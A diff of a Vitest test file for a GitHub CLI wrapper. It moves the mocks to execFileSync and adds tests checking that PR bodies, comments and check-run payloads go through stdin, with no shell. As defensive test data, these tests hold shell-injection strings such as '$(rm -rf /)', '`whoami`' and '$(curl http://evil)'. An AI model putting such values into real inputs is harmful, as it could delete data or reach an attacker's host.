@@ -2,12 +2,15 @@ import { describe, it, expect, vi, beforeEach } from "vitest";
 import { getLinkedPR, getIssue, createPR, addPRComment, createCheckRun, isGhAvailable } from "../github.js";
 
 vi.mock("node:child_process", () => ({
-  execSync: vi.fn(),
+  execFileSync: vi.fn(),
 }));
 
-import { execSync } from "node:child_process";
+import { execFileSync } from "node:child_process";
 
-const mockExecSync = vi.mocked(execSync);
+// github.ts now invokes binaries via execFileSync(file, argsArray) — no shell.
+// The mocks below reconstruct a "file arg1 arg2 ..." string so the existing
+// command-prefix matching keeps working.
+const mockExecSync = vi.mocked(execFileSync);
 
 beforeEach(() => {
   mockExecSync.mockReset();
@@ -15,8 +18,8 @@ beforeEach(() => {
 
 // Helper: make gh --version succeed (gh is available)
 function mockGhAvailable() {
-  mockExecSync.mockImplementation((cmd: string | URL) => {
-    const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+  mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+    const cmdStr = [file, ...(args ?? [])].join(" ");
     if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
     return "" as any;
   });
@@ -50,8 +53,8 @@ describe("getLinkedPR", () => {
   });
 
   it("returns null when no PR exists for the branch", () => {
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("gh pr list")) return "[]" as any;
       return "" as any;
@@ -73,8 +76,8 @@ describe("getLinkedPR", () => {
       changedFiles: 5,
     }];
 
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("gh pr list")) return JSON.stringify(prData) as any;
       return "" as any;
@@ -106,8 +109,8 @@ describe("getLinkedPR", () => {
       changedFiles: 0,
     }];
 
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("gh pr list")) return JSON.stringify(prData) as any;
       return "" as any;
@@ -130,8 +133,8 @@ describe("getLinkedPR", () => {
       changedFiles: 0,
     }];
 
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("gh pr list")) return JSON.stringify(prData) as any;
       return "" as any;
@@ -142,8 +145,8 @@ describe("getLinkedPR", () => {
   });
 
   it("uses current branch when no branch argument provided", () => {
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("gh pr list")) {
         // When no branch arg, there should be no --head flag
@@ -157,8 +160,8 @@ describe("getLinkedPR", () => {
   });
 
   it("returns null when gh returns invalid JSON", () => {
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("gh pr list")) return "not json" as any;
       return "" as any;
@@ -183,8 +186,8 @@ describe("getIssue", () => {
       labels: [{ name: "bug" }, { name: "high-priority" }],
     };
 
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("gh issue view")) return JSON.stringify(issueData) as any;
       return "" as any;
@@ -207,8 +210,8 @@ describe("getIssue", () => {
       labels: [],
     };
 
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("gh issue view")) return JSON.stringify(issueData) as any;
       return "" as any;
@@ -219,8 +222,8 @@ describe("getIssue", () => {
   });
 
   it("returns null when issue not found", () => {
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("gh issue view")) return "" as any;
       return "" as any;
@@ -238,8 +241,8 @@ describe("getIssue", () => {
       labels: [],
     };
 
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("gh issue view")) return JSON.stringify(issueData) as any;
       return "" as any;
@@ -269,8 +272,8 @@ describe("createPR", () => {
       changedFiles: 3,
     };
 
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("gh pr create")) return JSON.stringify(prData) as any;
       return "" as any;
@@ -283,8 +286,8 @@ describe("createPR", () => {
   });
 
   it("returns null when gh pr create fails", () => {
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       // All gh commands return empty (failure)
       return "" as any;
@@ -301,8 +304,8 @@ describe("addPRComment", () => {
   });
 
   it("returns true on success", () => {
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("gh pr comment")) return "https://github.com/acme/app/pull/42#comment" as any;
       return "" as any;
@@ -312,8 +315,8 @@ describe("addPRComment", () => {
   });
 
   it("returns false when comment fails", () => {
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       return "" as any;
     });
@@ -329,8 +332,8 @@ describe("createCheckRun", () => {
   });
 
   it("returns check object with provided values", () => {
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("git rev-parse")) return "abc123def\n" as any;
       if (cmdStr.startsWith("gh api")) return "{}" as any;
@@ -346,13 +349,81 @@ describe("createCheckRun", () => {
   });
 
   it("returns null when HEAD sha cannot be resolved", () => {
-    mockExecSync.mockImplementation((cmd: string | URL) => {
-      const cmdStr = typeof cmd === "string" ? cmd : cmd.toString();
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
       if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
       if (cmdStr.startsWith("git rev-parse")) throw new Error("not a git repo");
       return "" as any;
     });
 
     expect(createCheckRun("test", "completed", "success")).toBeNull();
+  });
+});
+
+// Injection-fix guard: untrusted text (PR/comment bodies, check-run payloads)
+// must travel via stdin (the execFileSync `input` option), never embedded in
+// argv — and there must be no shell. These assertions FAIL against vulnerable
+// inline-argv code like gh(['pr','create','--title',t,'--body',body]).
+describe("argument safety (no shell injection surface)", () => {
+  // Each recorded call is [file, argsArray, options]; pull out file/args/input.
+  function calls() {
+    return mockExecSync.mock.calls.map((c) => ({
+      file: c[0] as string,
+      args: (c[1] as string[]) ?? [],
+      input: (c[2] as { input?: string } | undefined)?.input,
+    }));
+  }
+
+  it("createPR pipes the body via stdin, never argv", () => {
+    mockGhAvailable();
+    const body = "evil $(rm -rf /) `whoami`\nsecond line";
+    const title = "title with `backticks` and $(subshell)";
+    createPR(title, body, "main");
+
+    const call = calls().find((c) => c.args[0] === "pr" && c.args[1] === "create");
+    expect(call).toBeDefined();
+    expect(call!.args).toContain("--body-file");
+    expect(call!.args).toContain("-");
+    expect(call!.args).not.toContain(body); // body is NOT in argv
+    expect(call!.input).toBe(body); // body arrives via stdin
+    // Title is passed as a single argv element — no shell, so metacharacters
+    // are literal, not interpreted.
+    expect(call!.args).toContain(title);
+  });
+
+  it("addPRComment pipes the comment body via stdin, never argv", () => {
+    mockGhAvailable();
+    const body = "$(curl http://evil) `id` payload";
+    addPRComment(42, body);
+
+    const call = calls().find((c) => c.args[0] === "pr" && c.args[1] === "comment");
+    expect(call).toBeDefined();
+    expect(call!.args).toContain("--body-file");
+    expect(call!.args).toContain("-");
+    expect(call!.args).not.toContain(body);
+    expect(call!.input).toBe(body);
+  });
+
+  it("createCheckRun sends a JSON payload via stdin (--input -), never argv", () => {
+    mockExecSync.mockImplementation((file: string, args?: readonly string[]) => {
+      const cmdStr = [file, ...(args ?? [])].join(" ");
+      if (cmdStr === "gh --version") return "gh version 2.40.0\n" as any;
+      if (cmdStr.startsWith("git rev-parse")) return "abc123def\n" as any;
+      return "" as any;
+    });
+    createCheckRun("name `id`", "completed", "failure", "https://x/$(id)");
+
+    const call = calls().find((c) => c.args[0] === "api");
+    expect(call).toBeDefined();
+    expect(call!.args).toContain("--input");
+    expect(call!.args).toContain("-");
+    // Raw metacharacters never reach argv...
+    expect(call!.args.join(" ")).not.toContain("$(id)");
+    // ...they're carried as a well-formed JSON document over stdin.
+    const payload = JSON.parse(call!.input as string) as Record<string, unknown>;
+    expect(payload.name).toBe("name `id`");
+    expect(payload.head_sha).toBe("abc123def");
+    expect(payload.conclusion).toBe("failure");
+    expect(payload.details_url).toBe("https://x/$(id)");
   });
 });
